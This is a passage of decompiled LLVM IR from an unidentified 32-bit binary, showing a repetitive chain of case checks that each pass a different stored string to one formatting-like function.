  br i1 %v1_8049ee2, label %dec_label_pc_8049f0e, label %dec_label_pc_8049ee4

dec_label_pc_8049ee4:                             ; preds = %dec_label_pc_8049ede
  %v0_8049ee4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049ee4 = zext i8 %v0_8049ee4 to i32
  store i32 %v1_8049ee4, i32* @edx, align 4
  %v0_8049ef0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049ef0 = zext i8 %v0_8049ef0 to i32
  %v2_8049eff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049eff, i32* @ebx, align 4
  %v5_8049f06 = call i32 @function_8048b5b(i32 %v2_8049eff, i32 ptrtoint ([12 x i8]* @global_var_8059f60.47 to i32), i32 %v1_8049ef0, i32 %v1_8049ee4)
  br label %dec_label_pc_8049f0e

dec_label_pc_8049f0e:                             ; preds = %dec_label_pc_8049ede, %dec_label_pc_8049ee4
  %v12_8049f0e = icmp eq i32 %v11_8049e19, 5
  %v1_8049f12 = icmp eq i1 %v12_8049f0e, false
  br i1 %v1_8049f12, label %dec_label_pc_8049f3e, label %dec_label_pc_8049f14

dec_label_pc_8049f14:                             ; preds = %dec_label_pc_8049f0e
  %v0_8049f14 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049f14 = zext i8 %v0_8049f14 to i32
  store i32 %v1_8049f14, i32* @edx, align 4
  %v0_8049f20 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049f20 = zext i8 %v0_8049f20 to i32
  %v2_8049f2f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f2f, i32* @ebx, align 4
  %v5_8049f36 = call i32 @function_8048b5b(i32 %v2_8049f2f, i32 ptrtoint ([12 x i8]* @global_var_8059f6c.48 to i32), i32 %v1_8049f20, i32 %v1_8049f14)
  br label %dec_label_pc_8049f3e

dec_label_pc_8049f3e:                             ; preds = %dec_label_pc_8049f0e, %dec_label_pc_8049f14
  %v12_8049f3e = icmp eq i32 %v11_8049e19, 6
  %v1_8049f42 = icmp eq i1 %v12_8049f3e, false
  br i1 %v1_8049f42, label %dec_label_pc_8049f6e, label %dec_label_pc_8049f44

dec_label_pc_8049f44:                             ; preds = %dec_label_pc_8049f3e
  %v0_8049f44 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049f44 = zext i8 %v0_8049f44 to i32
  store i32 %v1_8049f44, i32* @edx, align 4
  %v0_8049f50 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049f50 = zext i8 %v0_8049f50 to i32
  %v2_8049f5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f5f, i32* @ebx, align 4
  %v5_8049f66 = call i32 @function_8048b5b(i32 %v2_8049f5f, i32 ptrtoint ([13 x i8]* @global_var_8059f78.49 to i32), i32 %v1_8049f50, i32 %v1_8049f44)
  br label %dec_label_pc_8049f6e

dec_label_pc_8049f6e:                             ; preds = %dec_label_pc_8049f3e, %dec_label_pc_8049f44
  %v12_8049f6e = icmp eq i32 %v11_8049e19, 7
  %v1_8049f72 = icmp eq i1 %v12_8049f6e, false
  br i1 %v1_8049f72, label %dec_label_pc_8049f9e, label %dec_label_pc_8049f74

dec_label_pc_8049f74:                             ; preds = %dec_label_pc_8049f6e
  %v0_8049f74 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049f74 = zext i8 %v0_8049f74 to i32
  store i32 %v1_8049f74, i32* @edx, align 4
  %v0_8049f80 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049f80 = zext i8 %v0_8049f80 to i32
  %v2_8049f8f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f8f, i32* @ebx, align 4
  %v5_8049f96 = call i32 @function_8048b5b(i32 %v2_8049f8f, i32 ptrtoint ([13 x i8]* @global_var_8059f85.50 to i32), i32 %v1_8049f80, i32 %v1_8049f74)
  br label %dec_label_pc_8049f9e

dec_label_pc_8049f9e:                             ; preds = %dec_label_pc_8049f6e, %dec_label_pc_8049f74
  %v12_8049f9e = icmp eq i32 %v11_8049e19, 8
  %v1_8049fa2 = icmp eq i1 %v12_8049f9e, false
  br i1 %v1_8049fa2, label %dec_label_pc_8049fce, label %dec_label_pc_8049fa4

dec_label_pc_8049fa4:                             ; preds = %dec_label_pc_8049f9e
  %v0_8049fa4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049fa4 = zext i8 %v0_8049fa4 to i32
  store i32 %v1_8049fa4, i32* @edx, align 4
  %v0_8049fb0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049fb0 = zext i8 %v0_8049fb0 to i32
  %v2_8049fbf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fbf, i32* @ebx, align 4
  %v5_8049fc6 = call i32 @function_8048b5b(i32 %v2_8049fbf, i32 ptrtoint ([13 x i8]* @global_var_8059f92.51 to i32), i32 %v1_8049fb0, i32 %v1_8049fa4)
  br label %dec_label_pc_8049fce

dec_label_pc_8049fce:                             ; preds = %dec_label_pc_8049f9e, %dec_label_pc_8049fa4
  %v12_8049fce = icmp eq i32 %v11_8049e19, 9
  %v1_8049fd2 = icmp eq i1 %v12_8049fce, false
  br i1 %v1_8049fd2, label %dec_label_pc_8049ffe, label %dec_label_pc_8049fd4

dec_label_pc_8049fd4:                             ; preds = %dec_label_pc_8049fce
  %v0_8049fd4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049fd4 = zext i8 %v0_8049fd4 to i32
  store i32 %v1_8049fd4, i32* @edx, align 4
  %v0_8049fe0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049fe0 = zext i8 %v0_8049fe0 to i32
  %v2_8049fef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fef, i32* @ebx, align 4
  %v5_8049ff6 = call i32 @function_8048b5b(i32 %v2_8049fef, i32 ptrtoint ([13 x i8]* @global_var_8059f9f.52 to i32), i32 %v1_8049fe0, i32 %v1_8049fd4)
  br label %dec_label_pc_8049ffe

dec_label_pc_8049ffe:                             ; preds = %dec_label_pc_8049fce, %dec_label_pc_8049fd4
  %v12_8049ffe = icmp eq i32 %v11_8049e19, 10
  %v1_804a002 = icmp eq i1 %v12_8049ffe, false
  br i1 %v1_804a002, label %dec_label_pc_804a02e, label %dec_label_pc_804a004

dec_label_pc_804a004:                             ; preds = %dec_label_pc_8049ffe
  %v0_804a004 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a004 = zext i8 %v0_804a004 to i32
  store i32 %v1_804a004, i32* @edx, align 4
  %v0_804a010 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a010 = zext i8 %v0_804a010 to i32
  %v2_804a01f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a01f, i32* @ebx, align 4
  %v5_804a026 = call i32 @function_8048b5b(i32 %v2_804a01f, i32 ptrtoint ([13 x i8]* @global_var_8059fac.53 to i32), i32 %v1_804a010, i32 %v1_804a004)
  br label %dec_label_pc_804a02e

dec_label_pc_804a02e:                             ; preds = %dec_label_pc_8049ffe, %dec_label_pc_804a004
  %v12_804a02e = icmp eq i32 %v11_8049e19, 11
  %v1_804a032 = icmp eq i1 %v12_804a02e, false
  br i1 %v1_804a032, label %dec_label_pc_804a05e, label %dec_label_pc_804a034

dec_label_pc_804a034:                             ; preds = %dec_label_pc_804a02e
  %v0_804a034 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a034 = zext i8 %v0_804a034 to i32
  store i32 %v1_804a034, i32* @edx, align 4
  %v0_804a040 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a040 = zext i8 %v0_804a040 to i32
  %v2_804a04f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a04f, i32* @ebx, align 4
  %v5_804a056 = call i32 @function_8048b5b(i32 %v2_804a04f, i32 ptrtoint ([13 x i8]* @global_var_8059fb9.54 to i32), i32 %v1_804a040, i32 %v1_804a034)
  br label %dec_label_pc_804a05e

dec_label_pc_804a05e:                             ; preds = %dec_label_pc_804a02e, %dec_label_pc_804a034
  %v12_804a05e = icmp eq i32 %v11_8049e19, 12
  %v1_804a062 = icmp eq i1 %v12_804a05e, false
  br i1 %v1_804a062, label %dec_label_pc_804a08e, label %dec_label_pc_804a064

dec_label_pc_804a064:                             ; preds = %dec_label_pc_804a05e
  %v0_804a064 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a064 = zext i8 %v0_804a064 to i32
  store i32 %v1_804a064, i32* @edx, align 4
  %v0_804a070 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a070 = zext i8 %v0_804a070 to i32
  %v2_804a07f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a07f, i32* @ebx, align 4
  %v5_804a086 = call i32 @function_8048b5b(i32 %v2_804a07f, i32 ptrtoint ([13 x i8]* @global_var_8059fc6.55 to i32), i32 %v1_804a070, i32 %v1_804a064)
  br label %dec_label_pc_804a08e

dec_label_pc_804a08e:                             ; preds = %dec_label_pc_804a05e, %dec_label_pc_804a064
  %v12_804a08e = icmp eq i32 %v11_8049e19, 13
  %v1_804a092 = icmp eq i1 %v12_804a08e, false
  br i1 %v1_804a092, label %dec_label_pc_804a0be, label %dec_label_pc_804a094

dec_label_pc_804a094:                             ; preds = %dec_label_pc_804a08e
  %v0_804a094 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a094 = zext i8 %v0_804a094 to i32
  store i32 %v1_804a094, i32* @edx, align 4
  %v0_804a0a0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a0a0 = zext i8 %v0_804a0a0 to i32
  %v2_804a0af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0af, i32* @ebx, align 4
  %v5_804a0b6 = call i32 @function_8048b5b(i32 %v2_804a0af, i32 ptrtoint ([13 x i8]* @global_var_8059fd3.56 to i32), i32 %v1_804a0a0, i32 %v1_804a094)
  br label %dec_label_pc_804a0be

dec_label_pc_804a0be:                             ; preds = %dec_label_pc_804a08e, %dec_label_pc_804a094
  %v12_804a0be = icmp eq i32 %v11_8049e19, 14
  %v1_804a0c2 = icmp eq i1 %v12_804a0be, false
  br i1 %v1_804a0c2, label %dec_label_pc_804a0ee, label %dec_label_pc_804a0c4

dec_label_pc_804a0c4:                             ; preds = %dec_label_pc_804a0be
  %v0_804a0c4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a0c4 = zext i8 %v0_804a0c4 to i32
  store i32 %v1_804a0c4, i32* @edx, align 4
  %v0_804a0d0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a0d0 = zext i8 %v0_804a0d0 to i32
  %v2_804a0df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0df, i32* @ebx, align 4
  %v5_804a0e6 = call i32 @function_8048b5b(i32 %v2_804a0df, i32 ptrtoint ([12 x i8]* @global_var_8059fe0.57 to i32), i32 %v1_804a0d0, i32 %v1_804a0c4)
  br label %dec_label_pc_804a0ee

dec_label_pc_804a0ee:                             ; preds = %dec_label_pc_804a0be, %dec_label_pc_804a0c4
  %v12_804a0ee = icmp eq i32 %v11_8049e19, 15
  %v1_804a0f2 = icmp eq i1 %v12_804a0ee, false
  br i1 %v1_804a0f2, label %dec_label_pc_804a11e, label %dec_label_pc_804a0f4

dec_label_pc_804a0f4:                             ; preds = %dec_label_pc_804a0ee
  %v0_804a0f4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a0f4 = zext i8 %v0_804a0f4 to i32
  store i32 %v1_804a0f4, i32* @edx, align 4
  %v0_804a100 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a100 = zext i8 %v0_804a100 to i32
  %v2_804a10f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a10f, i32* @ebx, align 4
  %v5_804a116 = call i32 @function_8048b5b(i32 %v2_804a10f, i32 ptrtoint ([12 x i8]* @global_var_8059fec.58 to i32), i32 %v1_804a100, i32 %v1_804a0f4)
  br label %dec_label_pc_804a11e

dec_label_pc_804a11e:                             ; preds = %dec_label_pc_804a0ee, %dec_label_pc_804a0f4
  %v9_804a11e = icmp eq i32 %v11_8049e19, 16
  %v1_804a122 = icmp eq i1 %v9_804a11e, false
  br i1 %v1_804a122, label %dec_label_pc_804a14e, label %dec_label_pc_804a124

dec_label_pc_804a124:                             ; preds = %dec_label_pc_804a11e
  %v0_804a124 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a124 = zext i8 %v0_804a124 to i32
  store i32 %v1_804a124, i32* @edx, align 4
  %v0_804a130 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a130 = zext i8 %v0_804a130 to i32
  %v2_804a13f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a13f, i32* @ebx, align 4
  %v5_804a146 = call i32 @function_8048b5b(i32 %v2_804a13f, i32 ptrtoint ([13 x i8]* @global_var_8059ff8.59 to i32), i32 %v1_804a130, i32 %v1_804a124)
  br label %dec_label_pc_804a14e

dec_label_pc_804a14e:                             ; preds = %dec_label_pc_804a11e, %dec_label_pc_804a124
  %v12_804a14e = icmp eq i32 %v11_8049e19, 17
  %v1_804a152 = icmp eq i1 %v12_804a14e, false
  br i1 %v1_804a152, label %dec_label_pc_804a17e, label %dec_label_pc_804a154

dec_label_pc_804a154:                             ; preds = %dec_label_pc_804a14e
  %v0_804a154 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a154 = zext i8 %v0_804a154 to i32
  store i32 %v1_804a154, i32* @edx, align 4
  %v0_804a160 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a160 = zext i8 %v0_804a160 to i32
  %v2_804a16f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a16f, i32* @ebx, align 4
  %v5_804a176 = call i32 @function_8048b5b(i32 %v2_804a16f, i32 ptrtoint ([13 x i8]* @global_var_805a005.60 to i32), i32 %v1_804a160, i32 %v1_804a154)
  br label %dec_label_pc_804a17e

dec_label_pc_804a17e:                             ; preds = %dec_label_pc_804a14e, %dec_label_pc_804a154
  %v12_804a17e = icmp eq i32 %v11_8049e19, 18
  %v1_804a182 = icmp eq i1 %v12_804a17e, false
  br i1 %v1_804a182, label %dec_label_pc_804a1ae, label %dec_label_pc_804a184

dec_label_pc_804a184:                             ; preds = %dec_label_pc_804a17e
  %v0_804a184 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a184 = zext i8 %v0_804a184 to i32
  store i32 %v1_804a184, i32* @edx, align 4
  %v0_804a190 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a190 = zext i8 %v0_804a190 to i32
  %v2_804a19f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a19f, i32* @ebx, align 4
  %v5_804a1a6 = call i32 @function_8048b5b(i32 %v2_804a19f, i32 ptrtoint ([13 x i8]* @global_var_805a012.61 to i32), i32 %v1_804a190, i32 %v1_804a184)
  br label %dec_label_pc_804a1ae

dec_label_pc_804a1ae:                             ; preds = %dec_label_pc_804a17e, %dec_label_pc_804a184
  %v12_804a1ae = icmp eq i32 %v11_8049e19, 19
  %v1_804a1b2 = icmp eq i1 %v12_804a1ae, false
  br i1 %v1_804a1b2, label %dec_label_pc_804a1de, label %dec_label_pc_804a1b4

dec_label_pc_804a1b4:                             ; preds = %dec_label_pc_804a1ae
  %v0_804a1b4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a1b4 = zext i8 %v0_804a1b4 to i32
  store i32 %v1_804a1b4, i32* @edx, align 4
  %v0_804a1c0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a1c0 = zext i8 %v0_804a1c0 to i32
  %v2_804a1cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1cf, i32* @ebx, align 4
  %v5_804a1d6 = call i32 @function_8048b5b(i32 %v2_804a1cf, i32 ptrtoint ([12 x i8]* @global_var_805a01f.62 to i32), i32 %v1_804a1c0, i32 %v1_804a1b4)
  br label %dec_label_pc_804a1de

dec_label_pc_804a1de:                             ; preds = %dec_label_pc_804a1ae, %dec_label_pc_804a1b4
  %v12_804a1de = icmp eq i32 %v11_8049e19, 20
  %v1_804a1e2 = icmp eq i1 %v12_804a1de, false
  br i1 %v1_804a1e2, label %dec_label_pc_804a20e, label %dec_label_pc_804a1e4

dec_label_pc_804a1e4:                             ; preds = %dec_label_pc_804a1de
  %v0_804a1e4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a1e4 = zext i8 %v0_804a1e4 to i32
  store i32 %v1_804a1e4, i32* @edx, align 4
  %v0_804a1f0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a1f0 = zext i8 %v0_804a1f0 to i32
  %v2_804a1ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ff, i32* @ebx, align 4
  %v5_804a206 = call i32 @function_8048b5b(i32 %v2_804a1ff, i32 ptrtoint ([12 x i8]* @global_var_805a02b.63 to i32), i32 %v1_804a1f0, i32 %v1_804a1e4)
  br label %dec_label_pc_804a20e

dec_label_pc_804a20e:                             ; preds = %dec_label_pc_804a1de, %dec_label_pc_804a1e4
  %v12_804a20e = icmp eq i32 %v11_8049e19, 21
  %v1_804a212 = icmp eq i1 %v12_804a20e, false
  br i1 %v1_804a212, label %dec_label_pc_804a23e, label %dec_label_pc_804a214

dec_label_pc_804a214:                             ; preds = %dec_label_pc_804a20e
  %v0_804a214 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a214 = zext i8 %v0_804a214 to i32
  store i32 %v1_804a214, i32* @edx, align 4
  %v0_804a220 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a220 = zext i8 %v0_804a220 to i32
  %v2_804a22f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a22f, i32* @ebx, align 4
  %v5_804a236 = call i32 @function_8048b5b(i32 %v2_804a22f, i32 ptrtoint ([13 x i8]* @global_var_805a037.64 to i32), i32 %v1_804a220, i32 %v1_804a214)
  br label %dec_label_pc_804a23e

dec_label_pc_804a23e:                             ; preds = %dec_label_pc_804a20e, %dec_label_pc_804a214
  %v12_804a23e = icmp eq i32 %v11_8049e19, 22
  %v1_804a242 = icmp eq i1 %v12_804a23e, false
  br i1 %v1_804a242, label %dec_label_pc_804a26e, label %dec_label_pc_804a244

dec_label_pc_804a244:                             ; preds = %dec_label_pc_804a23e
  %v0_804a244 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a244 = zext i8 %v0_804a244 to i32
  store i32 %v1_804a244, i32* @edx, align 4
  %v0_804a250 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a250 = zext i8 %v0_804a250 to i32
  %v2_804a25f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a25f, i32* @ebx, align 4
  %v5_804a266 = call i32 @function_8048b5b(i32 %v2_804a25f, i32 ptrtoint ([12 x i8]* @global_var_805a044.65 to i32), i32 %v1_804a250, i32 %v1_804a244)
  br label %dec_label_pc_804a26e

dec_label_pc_804a26e:                             ; preds = %dec_label_pc_804a23e, %dec_label_pc_804a244
  %v12_804a26e = icmp eq i32 %v11_8049e19, 23
  %v1_804a272 = icmp eq i1 %v12_804a26e, false
  br i1 %v1_804a272, label %dec_label_pc_804a29e, label %dec_label_pc_804a274

dec_label_pc_804a274:                             ; preds = %dec_label_pc_804a26e
  %v0_804a274 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a274 = zext i8 %v0_804a274 to i32
  store i32 %v1_804a274, i32* @edx, align 4
  %v0_804a280 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a280 = zext i8 %v0_804a280 to i32
  %v2_804a28f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a28f, i32* @ebx, align 4
  %v5_804a296 = call i32 @function_8048b5b(i32 %v2_804a28f, i32 ptrtoint ([14 x i8]* @global_var_805a050.66 to i32), i32 %v1_804a280, i32 %v1_804a274)
  br label %dec_label_pc_804a29e

dec_label_pc_804a29e:                             ; preds = %dec_label_pc_804a26e, %dec_label_pc_804a274
  %v12_804a29e = icmp eq i32 %v11_8049e19, 24
  %v1_804a2a2 = icmp eq i1 %v12_804a29e, false
  br i1 %v1_804a2a2, label %dec_label_pc_804a2ce, label %dec_label_pc_804a2a4

dec_label_pc_804a2a4:                             ; preds = %dec_label_pc_804a29e
  %v0_804a2a4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a2a4 = zext i8 %v0_804a2a4 to i32
  store i32 %v1_804a2a4, i32* @edx, align 4
  %v0_804a2b0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a2b0 = zext i8 %v0_804a2b0 to i32
  %v2_804a2bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2bf, i32* @ebx, align 4
  %v5_804a2c6 = call i32 @function_8048b5b(i32 %v2_804a2bf, i32 ptrtoint ([11 x i8]* @global_var_805a05e.67 to i32), i32 %v1_804a2b0, i32 %v1_804a2a4)
  br label %dec_label_pc_804a2ce

dec_label_pc_804a2ce:                             ; preds = %dec_label_pc_804a29e, %dec_label_pc_804a2a4
  %v12_804a2ce = icmp eq i32 %v11_8049e19, 25
  %v1_804a2d2 = icmp eq i1 %v12_804a2ce, false
  br i1 %v1_804a2d2, label %dec_label_pc_804a2fe, label %dec_label_pc_804a2d4

dec_label_pc_804a2d4:                             ; preds = %dec_label_pc_804a2ce
  %v0_804a2d4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a2d4 = zext i8 %v0_804a2d4 to i32
  store i32 %v1_804a2d4, i32* @edx, align 4
  %v0_804a2e0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a2e0 = zext i8 %v0_804a2e0 to i32
  %v2_804a2ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2ef, i32* @ebx, align 4
  %v5_804a2f6 = call i32 @function_8048b5b(i32 %v2_804a2ef, i32 ptrtoint ([11 x i8]* @global_var_805a069.68 to i32), i32 %v1_804a2e0, i32 %v1_804a2d4)
  br label %dec_label_pc_804a2fe

dec_label_pc_804a2fe:                             ; preds = %dec_label_pc_804a2ce, %dec_label_pc_804a2d4
  %v12_804a2fe = icmp eq i32 %v11_8049e19, 26
  %v1_804a302 = icmp eq i1 %v12_804a2fe, false
  br i1 %v1_804a302, label %dec_label_pc_804a32e, label %dec_label_pc_804a304

dec_label_pc_804a304:                             ; preds = %dec_label_pc_804a2fe
  %v0_804a304 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a304 = zext i8 %v0_804a304 to i32
  store i32 %v1_804a304, i32* @edx, align 4
  %v0_804a310 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a310 = zext i8 %v0_804a310 to i32
  %v2_804a31f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a31f, i32* @ebx, align 4
  %v5_804a326 = call i32 @function_8048b5b(i32 %v2_804a31f, i32 ptrtoint ([12 x i8]* @global_var_805a074.69 to i32), i32 %v1_804a310, i32 %v1_804a304)
  br label %dec_label_pc_804a32e

dec_label_pc_804a32e:                             ; preds = %dec_label_pc_804a2fe, %dec_label_pc_804a304
  %v12_804a32e = icmp eq i32 %v11_8049e19, 27
  %v1_804a332 = icmp eq i1 %v12_804a32e, false
  br i1 %v1_804a332, label %dec_label_pc_804a35e, label %dec_label_pc_804a334

dec_label_pc_804a334:                             ; preds = %dec_label_pc_804a32e
  %v0_804a334 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a334 = zext i8 %v0_804a334 to i32
  store i32 %v1_804a334, i32* @edx, align 4
  %v0_804a340 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a340 = zext i8 %v0_804a340 to i32
  %v2_804a34f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a34f, i32* @ebx, align 4
  %v5_804a356 = call i32 @function_8048b5b(i32 %v2_804a34f, i32 ptrtoint ([12 x i8]* @global_var_805a080.70 to i32), i32 %v1_804a340, i32 %v1_804a334)
  br label %dec_label_pc_804a35e

dec_label_pc_804a35e:                             ; preds = %dec_label_pc_804a32e, %dec_label_pc_804a334
  %v12_804a35e = icmp eq i32 %v11_8049e19, 28
  %v1_804a362 = icmp eq i1 %v12_804a35e, false
  br i1 %v1_804a362, label %dec_label_pc_804a38e, label %dec_label_pc_804a364

dec_label_pc_804a364:                             ; preds = %dec_label_pc_804a35e
  %v0_804a364 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a364 = zext i8 %v0_804a364 to i32
  store i32 %v1_804a364, i32* @edx, align 4
  %v0_804a370 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a370 = zext i8 %v0_804a370 to i32
  %v2_804a37f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a37f, i32* @ebx, align 4
  %v5_804a386 = call i32 @function_8048b5b(i32 %v2_804a37f, i32 ptrtoint ([12 x i8]* @global_var_805a08c.71 to i32), i32 %v1_804a370, i32 %v1_804a364)
  br label %dec_label_pc_804a38e

dec_label_pc_804a38e:                             ; preds = %dec_label_pc_804a35e, %dec_label_pc_804a364
  %v12_804a38e = icmp eq i32 %v11_8049e19, 29
  %v1_804a392 = icmp eq i1 %v12_804a38e, false
  br i1 %v1_804a392, label %dec_label_pc_804a3be, label %dec_label_pc_804a394

dec_label_pc_804a394:                             ; preds = %dec_label_pc_804a38e
  %v0_804a394 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a394 = zext i8 %v0_804a394 to i32
  store i32 %v1_804a394, i32* @edx, align 4
  %v0_804a3a0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a3a0 = zext i8 %v0_804a3a0 to i32
  %v2_804a3af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3af, i32* @ebx, align 4
  %v5_804a3b6 = call i32 @function_8048b5b(i32 %v2_804a3af, i32 ptrtoint ([13 x i8]* @global_var_805a098.72 to i32), i32 %v1_804a3a0, i32 %v1_804a394)
  br label %dec_label_pc_804a3be

dec_label_pc_804a3be:                             ; preds = %dec_label_pc_804a38e, %dec_label_pc_804a394
  %v12_804a3be = icmp eq i32 %v11_8049e19, 30
  %v1_804a3c2 = icmp eq i1 %v12_804a3be, false
  br i1 %v1_804a3c2, label %dec_label_pc_804a3ee, label %dec_label_pc_804a3c4

dec_label_pc_804a3c4:                             ; preds = %dec_label_pc_804a3be
  %v0_804a3c4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a3c4 = zext i8 %v0_804a3c4 to i32
  store i32 %v1_804a3c4, i32* @edx, align 4
  %v0_804a3d0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a3d0 = zext i8 %v0_804a3d0 to i32
  %v2_804a3df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3df, i32* @ebx, align 4
  %v5_804a3e6 = call i32 @function_8048b5b(i32 %v2_804a3df, i32 ptrtoint ([13 x i8]* @global_var_805a0a5.73 to i32), i32 %v1_804a3d0, i32 %v1_804a3c4)
  br label %dec_label_pc_804a3ee

dec_label_pc_804a3ee:                             ; preds = %dec_label_pc_804a3be, %dec_label_pc_804a3c4
  %v12_804a3ee = icmp eq i32 %v11_8049e19, 31
  %v1_804a3f2 = icmp eq i1 %v12_804a3ee, false
  br i1 %v1_804a3f2, label %dec_label_pc_804a41e, label %dec_label_pc_804a3f4

dec_label_pc_804a3f4:                             ; preds = %dec_label_pc_804a3ee
  %v0_804a3f4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a3f4 = zext i8 %v0_804a3f4 to i32
  store i32 %v1_804a3f4, i32* @edx, align 4
  %v0_804a400 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a400 = zext i8 %v0_804a400 to i32
  %v2_804a40f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a40f, i32* @ebx, align 4
  %v5_804a416 = call i32 @function_8048b5b(i32 %v2_804a40f, i32 ptrtoint ([14 x i8]* @global_var_805a0b2.74 to i32), i32 %v1_804a400, i32 %v1_804a3f4)
  br label %dec_label_pc_804a41e

dec_label_pc_804a41e:                             ; preds = %dec_label_pc_804a3ee, %dec_label_pc_804a3f4
  %v9_804a41e = icmp eq i32 %v11_8049e19, 32
  %v1_804a422 = icmp eq i1 %v9_804a41e, false
  br i1 %v1_804a422, label %dec_label_pc_804a44e, label %dec_label_pc_804a424

dec_label_pc_804a424:                             ; preds = %dec_label_pc_804a41e
  %v0_804a424 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a424 = zext i8 %v0_804a424 to i32
  store i32 %v1_804a424, i32* @edx, align 4
  %v0_804a430 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a430 = zext i8 %v0_804a430 to i32
  %v2_804a43f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a43f, i32* @ebx, align 4
  %v5_804a446 = call i32 @function_8048b5b(i32 %v2_804a43f, i32 ptrtoint ([14 x i8]* @global_var_805a0c0.75 to i32), i32 %v1_804a430, i32 %v1_804a424)
  br label %dec_label_pc_804a44e

dec_label_pc_804a44e:                             ; preds = %dec_label_pc_804a41e, %dec_label_pc_804a424
  %v12_804a44e = icmp eq i32 %v11_8049e19, 33
  %v1_804a452 = icmp eq i1 %v12_804a44e, false
  br i1 %v1_804a452, label %dec_label_pc_804a47e, label %dec_label_pc_804a454

dec_label_pc_804a454:                             ; preds = %dec_label_pc_804a44e
  %v0_804a454 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a454 = zext i8 %v0_804a454 to i32
  store i32 %v1_804a454, i32* @edx, align 4
  %v0_804a460 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a460 = zext i8 %v0_804a460 to i32
